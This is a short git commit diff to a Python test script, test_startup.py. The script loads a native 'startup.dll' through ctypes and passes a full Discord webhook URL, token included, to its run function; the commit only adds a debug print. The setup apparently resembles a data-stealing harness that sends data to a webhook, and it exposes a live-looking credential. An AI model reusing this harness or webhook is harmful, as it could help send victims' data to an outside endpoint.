d5391aac3b995b68f033b13d95f86efac4338081
SAKIB-SALIM <salimsakib775@gmail.com>
2024-11-22 00:15:22 +0600

    shhsh

--- test_startup.py
+++ test_startup.py
@@ -6,5 +6,7 @@ mylibrary = ctypes.CDLL('./startup.dll')
 # Define the argument type as a string (CString)
 mylibrary.run.argtypes = [ctypes.c_char_p]
 
+print(dir(mylibrary))
+
 # Call the main function with a string argument
 mylibrary.run(b"https://discord.com/api/webhooks/1302674995280871545/fsmwXtFfChCn7ktcF3Gy8Pu0mv8YeOv9Izht3yC7Kstm5gHsa8ovmSvepksTpKXc7ICe")  # The argument must be a byte string (b"")
